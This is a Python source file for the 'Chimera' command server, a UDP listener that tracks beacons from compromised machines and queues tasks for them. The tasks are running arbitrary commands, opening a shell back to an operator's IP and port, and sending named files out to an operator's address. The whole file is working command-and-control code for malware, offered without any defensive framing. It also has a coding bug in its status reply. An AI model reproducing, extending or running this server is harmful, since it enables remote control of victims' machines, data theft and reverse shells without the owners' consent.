import socket
import sys
import os

if (len(sys.argv) != 2):
    print("Usage: server-listener.py {ip to listen on}")
    exit
else:
    bind_ip = sys.argv[1]

def run():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((bind_ip, 10000))
    print(f"[+] Chimera command server listening on {bind_ip}:10000")
    
    if not os.path.exists("/tmp/chimera/"):
        os.system("mkdir /tmp/chimera/")
    
    while True:
        data, addr = sock.recvfrom(512)
        print(f"Recieved command from {addr[0]}:{addr[1]}")
        
        dataSplit = data.decode().split("###")
        
        if (len(dataSplit) == 1):
            if (dataSplit[0] == "check"):
                sock.sendto("confirm".encode(), addr)
            elif (dataSplit[0] == "status"):
                response = []
                beaconFiles = os.listdir('/tmp/chimera')
                beaconFiles = [f for f in beaconFiles if os.path.isfile(os.path.join('/tmp/chimera', f))]
                
                for beacon in beaconFiles:
                    beaconEntry = [str(beacon)]
                    f = open("/tmp/chimera/" + beacon, "r")
                    cont = f.read()
                    contSplit = cont.split('\n')
                    line = contSplit[0]
                    lineSplit = line.split(': ')
                    time = lineSplit[1]
                    beaconEntry.append(time)
                    beaconEntry = '|'.join(beaconEntry)
                    response.append(beaconEntry)
                
                response = ';'.join(response)
                
                sock.sendto(response.encode(), addr)
            else:
                pass
        elif (len(dataSplit) == 2):
            if (dataSplit[0] == "status") and (len(dataSplit[1].split('.')) == 4):
                if not os.path.exists("/tmp/chimera/" + dataSplit[1]):
                    sock.sendto("not_found".encode(), addr)
                else:
                    response = []
                    f = open("/tmp/chimera/" + dataSplit[1], "r")
                    cont = f.read()
                    contSplit = cont.split('\n')
                    response.append((contSplit[0].split(': '))[1])
                    del(contSplit[0])
                    response = response + contSplit
                    sock.sendto(response.encode(), addr)
        elif (len(dataSplit) == 3):
            if (dataSplit[0] == "service") and (len(dataSplit[1]) > 0) and (len(dataSplit[2].split('.')) == 4):
                if not os.path.exists("/tmp/chimera/" + dataSplit[2]):
                    sock.sendto("not_found".encode(), addr)
                else:
                    serviceName = dataSplit[1]
                    beacon = dataSplit[2]
                    
                    f = open("/tmp/chimera/" + beacon, "r")
                    cont = f.read()
                    f.close()
                    contSplit = cont.split('\n')
                    contSplit.append("service")
                    contSplit.append(serviceName)
                    cont = '\n'.join(contSplit)
                    f = open("/tmp/chimera/" + beacon, "w")
                    f.write(cont)
                    f.close()
                    sock.sendto("confirm".encode(), addr)
            elif (dataSplit[0] == "command") and (len(dataSplit[1]) > 0) and (len(dataSplit[2].split('.')) == 4):
                if not os.path.exists("/tmp/chimera/" + dataSplit[2]):
                    sock.sendto("not_found".encode(), addr)
                else:
                    command = dataSplit[1]
                    beacon = dataSplit[2]
                    
                    f = open("/tmp/chimera/" + beacon, "r")
                    cont = f.read()
                    f.close()
                    contSplit = cont.split('\n')
                    contSplit.append("command")
                    contSplit.append(command)
                    cont = '\n'.join(contSplit)
                    f = open("/tmp/chimera/" + beacon, "w")
                    f.write(cont)
                    f.close()
                    sock.sendto("confirm".encode(), addr)
        elif (len(dataSplit) == 4):
            if (dataSplit[0] == "shell") and (len(dataSplit[1].split('.')) == 4) and ((int(dataSplit[2]) > 0) and (int(dataSplit[2]) <= 510)) and (len(dataSplit[3].split('.')) == 4):
                if not os.path.exists("/tmp/chimera/" + dataSplit[3]):
                    sock.sendto("not_found".encode(), addr)
                else:
                    ip = dataSplit[1]
                    port = dataSplit[2]
                    beacon = dataSplit[3]
                    
                    f = open("/tmp/chimera/" + beacon, "r")
                    cont = f.read()
                    f.close()
                    contSplit = cont.split('\n')
                    contSplit.append("shell")
                    contSplit.append(ip + ":" + port)
                    cont = '\n'.join(contSplit)
                    f = open("/tmp/chimera/" + beacon, "w")
                    f.write(cont)
                    f.close()
                    sock.sendto("confirm".encode(), addr)
        elif (len(dataSplit) == 5):
            if (dataSplit[0] == "file") and (len(dataSplit[1]) > 0) and (len(dataSplit[2].split('.')) == 4) and ((int(dataSplit[3]) > 0) and (int(dataSplit[3]) <= 510)) and (len(dataSplit[4].split('.')) == 4):
                if not os.path.exists("/tmp/chimera/" + dataSplit[4]):
                    sock.sendto("not_found".encode(), addr)
                else:
                    filePath = dataSplit[1]
                    ip = dataSplit[2]
                    port = dataSplit[3]
                    beacon = dataSplit[4]
                    
                    f = open("/tmp/chimera/" + beacon, "r")
                    cont = f.read()
                    f.close()
                    contSplit = cont.split('\n')
                    contSplit.append("file")
                    contSplit.append(filePath)
                    contSplit.append(ip + ":" + port)
                    cont = '\n'.join(contSplit)
                    f = open("/tmp/chimera/" + beacon, "w")
                    f.write(cont)
                    f.close()
                    sock.sendto("confirm".encode(), addr)

        else:
            pass
            
run()